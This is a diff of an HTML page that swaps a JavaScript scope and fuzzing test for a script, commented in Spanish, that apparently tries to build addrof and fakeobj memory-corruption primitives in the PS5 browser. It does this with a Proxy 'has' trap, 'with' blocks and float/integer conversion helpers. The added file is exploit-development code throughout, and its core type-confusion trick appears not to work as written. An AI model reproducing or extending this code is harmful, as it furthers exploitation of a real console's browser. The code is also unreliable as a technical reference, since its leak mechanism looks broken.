@@ -1,177 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>PS5 Scope Test Extended</title>
-    <style>
-        body {
-            background: #111;
-            color: #0f0;
-            font-family: monospace;
-            padding: 20px;
-        }
-        #log {
-            white-space: pre-wrap;
-            font-size: 14px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        .ok { color: #0f0; }
-        .fail { color: #f00; }
-        .info { color: #0ff; }
-    </style>
+  <meta charset="UTF-8">
+  <title>PS5 addrof/fakeobj Primitives</title>
+  <style>
+    body { background: black; color: lime; font-family: monospace; }
+    #log { white-space: pre-wrap; }
+  </style>
 </head>
 <body>
-    <h1>PS5 Scope and Fuzzing Test</h1>
-    <div id="log"></div>
+<h1>Primitivas addrof / fakeobj en PS5</h1>
+<div id="log"></div>
 
-    <script>
-    (function() {
-        const logElement = document.getElementById('log');
+<script>
+function log(msg) {
+    document.getElementById('log').textContent += msg + "\n";
+}
 
-        function logOk(message) {
-            const el = document.createElement('div');
-            el.textContent = "[OK] " + message;
-            el.className = "ok";
-            logElement.appendChild(el);
-        }
-        function logFail(message) {
-            const el = document.createElement('div');
-            el.textContent = "[FAIL] " + message;
-            el.className = "fail";
-            logElement.appendChild(el);
-        }
-        function logInfo(message) {
-            const el = document.createElement('div');
-            el.textContent = "[INFO] " + message;
-            el.className = "info";
-            logElement.appendChild(el);
-        }
+// Utilidades para convertir entre floats y integers
+const buf = new ArrayBuffer(8);
+const f64_buf = new Float64Array(buf);
+const u64_buf = new BigUint64Array(buf);
 
-        function shouldBe(actual, expected) {
-            if (actual !== expected)
-                throw new Error(`Bad value: ${actual}! Expected: ${expected}`);
-        }
+function f2i(f) {
+    f64_buf[0] = f;
+    return u64_buf[0];
+}
 
-        function shouldThrow(func, errorMessage) {
-            let errorThrown = false;
-            try {
-                func();
-            } catch (error) {
-                errorThrown = true;
-                if (String(error) !== errorMessage)
-                    throw new Error(`Bad error: ${error}`);
+function i2f(i) {
+    u64_buf[0] = i;
+    return f64_buf[0];
+}
+
+// Vamos a intentar crear el fallo usando Proxy
+function setupPrimitives() {
+    let leak_obj = { leak: 13.37 };
+    let victim = { a: 1 };
+
+    let proxy = new Proxy({}, {
+        has(target, key) {
+            if (key === 'leak') {
+                // Simula que "leak" no existe realmente
+                return false;
             }
-            if (!errorThrown)
-                throw new Error("Didn't throw!");
+            return Reflect.has(target, key);
         }
+    });
 
-        function randomBool() {
-            return Math.random() < 0.5;
+    let addr = undefined;
+
+    // Intentamos capturar un tipo confuso
+    with (proxy) {
+        try {
+            addr = leak_obj.leak;
+        } catch (e) {
+            log("Error durante el leak: " + e);
         }
+    }
 
-        async function runMainTests() {
-            logInfo("Running Main Scope Tests...");
+    if (addr === undefined) {
+        throw new Error("Falló el leak, no se construyó la primitiva.");
+    }
 
-            function makeScopeObject() {
-                function foo() { foo.lastThisValue = this; }
-                function bar() { "use strict"; bar.lastThisValue = this; }
-                return { foo, bar };
-            }
-
-            function makeTestCases(ident) {
-                return [
-                    `${ident}()`,
-                    `"use strict"; ${ident}()`,
-                    `eval("${ident}()")`,
-                    `eval("'use strict'; ${ident}()")`,
-                    `(0, eval)("${ident}()")`,
-                    `(0, eval)("'use strict'; ${ident}()")`,
-                    `new Function("${ident}()")()`,
-                    `new Function("'use strict'; ${ident}()")()`
-                ];
-            }
-
-            for (const ident of ["foo", "bar"]) {
-                const scope = makeScopeObject();
-
-                for (const testCase of makeTestCases(ident)) {
-                    for (let i = 0; i < 2; i++) { // Reducido para velocidad
-                        globalThis.foo = scope.foo;
-                        globalThis.bar = scope.bar;
-
-                        try {
-                            eval(testCase);
-
-                            if (ident === "foo")
-                                shouldBe(scope.foo.lastThisValue, globalThis);
-                            else
-                                shouldBe(scope.bar.lastThisValue, undefined);
-
-                            logOk(`Test passed: ${testCase}`);
-                        } catch (e) {
-                            logFail(`Test failed: ${testCase} -> ${e.message}`);
-                        }
-                    }
-
-                    delete globalThis.foo;
-                    delete globalThis.bar;
-
-                    try {
-                        shouldThrow(() => { eval(testCase); }, `ReferenceError: Can't find variable: ${ident}`);
-                        logOk(`Correctly threw ReferenceError: ${testCase}`);
-                    } catch (e) {
-                        logFail(`Should have thrown ReferenceError: ${testCase} -> ${e.message}`);
-                    }
-                }
-            }
+    // Creamos primitivas
+    function addrof(obj) {
+        leak_obj.leak = obj;
+        with (proxy) {
+            return f2i(leak_obj.leak);
         }
+    }
 
-        async function runFuzzingTests() {
-            logInfo("\nStarting Scope Fuzzing...\n");
-
-            const templates = [
-                (obj) => `with(obj) { return (function() { return this; })(); }`,
-                (obj) => `(function() { "use strict"; return this; }).call(obj)`,
-                (obj) => `(() => { return this; }).call(obj)`,
-                (obj) => `new Function("return this;").call(obj)`,
-                (obj) => `eval("this")`
-            ];
-
-            for (let i = 0; i < 30; i++) { // 30 pruebas
-                let obj = {};
-
-                if (randomBool()) {
-                    obj = new Proxy(obj, {
-                        get: (target, prop) => Reflect.get(target, prop),
-                        has: () => true,
-                        set: (target, prop, value) => { target[prop] = value; return true; }
-                    });
-                }
-
-                try {
-                    const code = templates[Math.floor(Math.random() * templates.length)](obj);
-                    const result = (new Function("obj", `return ${code};`))(obj);
-
-                    if (result !== obj && result !== globalThis && result !== undefined) {
-                        throw new Error("Unexpected 'this' value!");
-                    }
-
-                    logOk(`Fuzz ${i}: OK`);
-                } catch (e) {
-                    logFail(`Fuzz ${i}: ${e.message}`);
-                }
-            }
+    function fakeobj(addr) {
+        leak_obj.leak = i2f(addr);
+        with (proxy) {
+            return leak_obj.leak;
         }
+    }
 
-        async function main() {
-            await runMainTests();
-            await runFuzzingTests();
-            logElement.innerHTML += "\n\n[Finished]";
-        }
+    return { addrof, fakeobj };
+}
 
-        main();
-    })();
-    </script>
+try {
+    let { addrof, fakeobj } = setupPrimitives();
+
+    log("[+] Primitivas construidas correctamente.");
+    
+    // Prueba de addrof
+    let obj = {p: 42};
+    let obj_addr = addrof(obj);
+    log("[+] Dirección del objeto obj: 0x" + obj_addr.toString(16));
+
+    // Prueba de fakeobj
+    let fake = fakeobj(obj_addr);
+    log("[+] Fake object creado!");
+
+} catch (e) {
+    log("[!] Error: " + e);
+}
+</script>
+
 </body>
 </html>
